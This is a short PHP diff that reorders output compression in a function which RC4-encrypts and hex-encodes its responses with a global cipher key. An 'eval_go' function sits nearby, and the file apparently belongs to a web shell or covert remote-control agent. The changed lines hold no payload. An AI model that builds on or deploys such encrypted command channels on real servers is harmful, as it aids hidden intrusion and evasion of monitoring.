@@ -997,11 +997,8 @@ if(!function_exists('eval_go')){
 
 if(!function_exists('output')){
 	function output($str, $err=null){
-		$error = @ob_get_contents();
+		@ob_get_contents();
 		@ob_end_clean();
-        if (strlen($str) > 10240) {
-            @ini_set('zlib.output_compression', TRUE);
-        }
 		header("Content-Type: text/plain; charset=utf-8");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
@@ -1011,7 +1008,11 @@ if(!function_exists('output')){
         } else {
             $str = $header.'|0|'.from_encode($str);
         }
-		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
+        $c = bin2hex(rc4($GLOBALS['cipher_key'], $str));
+        if (strlen($c) > 10240) {
+            @ini_set('zlib.output_compression', TRUE);
+        }
+		echo $c;
 		die();
 	}
 }
